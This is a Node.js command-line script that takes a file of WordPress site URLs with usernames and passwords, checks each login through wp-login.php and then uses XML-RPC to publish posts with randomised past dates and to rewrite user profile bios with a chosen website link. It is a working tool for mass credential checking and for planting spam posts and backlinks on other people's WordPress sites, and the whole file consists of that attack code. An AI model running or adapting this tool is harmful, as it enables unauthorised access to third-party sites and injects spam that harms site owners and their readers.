const { Command } = require('commander');
const program = new Command();
const fs = require('fs/promises');
const {default: axios} = require('axios');
const urlParser = require('node:url');
const util = require('util');
const htmlParser = require('node-html-parser');
const xmlrpc = require('@0xengine/xmlrpc');
const qs = require('node:querystring');
const _ = require('lodash');
const moment = require('moment');
const Chance = require('chance')
const chance = new Chance();

const DefaultNoDuplicates = false;
const DefaultMaxPosts = 20;
const DefaultFrom = 0;
const DefaultSeparator = ";"

function createRandomDateInPastYear() {
	const year = moment().subtract(1, 'year').year();
	const date = chance.date({year});
	return date;
}

function createXmlClient(hostname, protocol) {
	const xmlrpcOptions = {
		host: hostname,
		port: protocol === 'https:' ? 443 : 80, // NOTE: protocol comes with semicolon (:)
		path: '/xmlrpc.php'
	};
	
	const client = xmlrpcOptions.port === 443 ? 
		xmlrpc.createSecureClient(xmlrpcOptions) : 
		xmlrpc.createClient(xmlrpcOptions);

	client.methodCall2 = util.promisify(client.methodCall.bind(client));
	return client;
}



async function wpLogin(host, protocol, username, password) {
	const payload = qs.stringify({
		log: username,
		pwd: password,
		testcookie: '1',
		'wp-submit': 'Log In',
		redirect_to: `${protocol}//${host}/wp-admin`
	});
	
	const result = {
		usernameOk: false,
		passwordOk: false,
		loggedIn: false
	};
	try {
		const response = await axios.post(
			`${protocol}//${host}/wp-login.php`, 
			payload,
			{
				maxRedirects: 0,
				validateStatus: function (status) {
					// if this function returns true, exception is not thrown, so
					// in simplest case just return true to handle status checks externally.
					return true;
				},
				headers: {
					Cookie: `wordpress_test_cookie=WP%20Cookie%20check`,
				}
			}
		);
		//console.log(response.data);
		const reNoUser = new RegExp(`The username <strong>${username}</strong> is not registered on this site`);
		const usernameIsNotRegistered = response.data.match(reNoUser) !== null;
		//console.log(`username not registered: ${usernameIsNotRegistered}`);
		const reInvalidPass = new RegExp(`The password you entered for the username <strong>${username}</strong> is incorrect`);
		const passwordIsInvalid = response.data.match(reInvalidPass) !== null;
		//console.log(`password is invalid: ${passwordIsInvalid}`);
		const {headers} = response;
		const loggedIn = headers['set-cookie'] !== undefined && headers['set-cookie'].find(c=>c.match("wordpress_logged_in")) !== undefined;
		result.loggedIn = loggedIn;
		result.usernameOk = !usernameIsNotRegistered;
		result.passwordOk = !passwordIsInvalid;
	} catch(err) {} // We don't care of a reason why we could not log in.

	return result;
}


async function pickRandomPost(pathToPost) {
	const postDirContents = await fs.readdir(pathToPost, {withFileTypes: true});
	const postFiles = postDirContents.filter(e=>e.isFile() === true).map(e=>e.name);
	if (postFiles.length === 0) {
		throw new Error("Post folder does not have post files");
	}
	const postFile = _.sample(postFiles);
	const post = await fs.readFile(`${pathToPost}/${postFile}`,{encoding: 'utf-8'});
	return post;
}

async function getPostId(xmlClient, blogid, username, password, postTitle) {
	const bulkSize = 100;
	let bulkCounter = 0;
	let postid = -1;
	let posts = []
	do {
		try {
			posts = await xmlClient.methodCall2('wp.getPosts', [
				blogid,
				username,
				password,
				{
					post_type: "post",
					number: bulkSize, // default: 10,
					offset: bulkCounter*bulkSize
				},
				[
					'post_id', 'post_title'
				],
				
			]);
			// console.log(`posts: ${posts.length}`)
			const post = posts.find(p=>p.post_title.toLowerCase() === postTitle.toLowerCase());
			if (post) {
				postid = post.post_id;
				// console.log(`post found: ${postid}`);
				break;
			}
			bulkCounter++;
		} 
		catch(err) {
			break;
		}
	}
	while (posts.length > 0);
	return postid;
}

async function run(pathToTargets, from, sep, pathToPost, noDuplicates, maxPosts, pathToBio, website) {

	const contents = await fs.readFile(pathToTargets, {encoding: 'utf8'});
	const lines = contents.split(/\r\n?|\n/).filter(line=>line.startsWith('http'));
	// console.log(lines);
	
	let newPostCount = 0;
	let existingPostCount = 0;
	for (let i=0; i<lines.length; i++) {
		if (newPostCount == maxPosts) {
			break; 
		}

		if (i<from) {
			continue;
		}

		const line = lines[i];
		let re = sep === ":" ? /:(?=[^\/]*$)/ : new RegExp(sep);
		
		const [url, username, password] = line.split(re);
		const {host, hostname, protocol} = new urlParser.URL(url);
		const xmlClient = createXmlClient(hostname, protocol);
		
		const wpLoginResult = await wpLogin(host, protocol, username, password);
		let blogid;
		try {
			([{blogid}] = await xmlClient.methodCall2('wp.getUsersBlogs', [username, password]));
		} catch(err) {}
		const report = `${i}|login|${line}|${wpLoginResult.usernameOk}|${wpLoginResult.passwordOk}|${wpLoginResult.loggedIn}|${blogid !== undefined}`;
		console.log(report);

		// Note: if ERROR 'Unknown tag TITLE' or similar is returned to XMLRPC request that means the /xmlrpc.php page is forbidden.
		// It's not forbidden by Wordpress but by web server. When XMLRPC is forbidden by Wordpress plugin,
		// there is XML error.
		
		if (blogid === undefined) {
			continue; // xmlrpc is not active
		}

		
		if (pathToPost) {
			const post = await pickRandomPost(pathToPost);
			const parsedPost = htmlParser.parse(post);
			const postTitle = parsedPost.querySelector('title').text;

			// https://codex.wordpress.org/XML-RPC_WordPress_API/Posts#Parameters_3
			let postid = -1;
			if (noDuplicates === true) {
				postid = await getPostId(xmlClient, blogid, username, password, postTitle);
			}
			if (postid === -1) {
				try {
					postid = await xmlClient.methodCall2('wp.newPost', [
						blogid,
						username,
						password,
						{
							post_type: 'post', // The post type (e.g., 'post', 'page', etc.)
							post_status: 'publish', // The post status (e.g., 'publish', 'draft', etc.)
							post_title: postTitle, // The title of the post
							post_content: post,
							post_date: createRandomDateInPastYear()
						}
					]);
					newPostCount++;
				}
				catch(err) {}
			}
			else {
				existingPostCount++;
			}
			const report = `${i}|post|${line}|${postid}|${newPostCount}|${existingPostCount}`;
			console.log(report);

		}
		
		if (pathToBio) {
			const {hostname, protocol} = new urlParser.URL(url);
			const xmlClient = createXmlClient(hostname, protocol);
			const bio = await fs.readFile(pathToBio, {encoding: 'utf-8'});
			// https://codex.wordpress.org/XML-RPC_WordPress_API/Users#wp.editProfile

			let success = false;
			try {
				await xmlClient.methodCall2('wp.editProfile', [
					blogid,
					username,
					password,
					{
						url: website,
						bio
					}
				]);
				success = true;
			}
			catch(err) {}
			const report = `${i}|bio|${line}|${success}`;
			console.log(report);
		}
	}
	console.log(`Done, new posts: ${newPostCount}`);
}

program
	.requiredOption('-t, --targets <string>', 'path to file with the target lines')
	.option('-f, --from <linenumber>', 'start from line number <linenumber>', DefaultFrom)
	.option('-s, --sep <char>', 'field separator of the lines', DefaultSeparator)
	.option('-p, --posts <string>', 'path to folder with posts')
	.option(`-a, --noduplicates <boolean>', 'does not post existing posts (default: ${DefaultNoDuplicates})`, DefaultNoDuplicates)
	.option('-m, --maxposts <number>', `maximal number of successfull posts to do and exit (default: ${DefaultMaxPosts})`, DefaultMaxPosts)
	.option('-b, --bio <string>', 'path to a file with biography')
	.option('-w, --website <string>', 'website url with which to update profile')
	.action(async ({targets, from, sep,posts, noduplicates, maxposts, bio, website})=>{
		console.log(`targets: ${targets} from: ${from} sep: ${sep} posts: ${posts} noduplicates: ${noduplicates} maxposts: ${maxposts} bio: ${bio} website: ${website}`);
		await run(targets, from, sep, posts, noduplicates, maxposts, bio, website);
	});


async function main() {
	await program.parseAsync(process.argv);
}

main()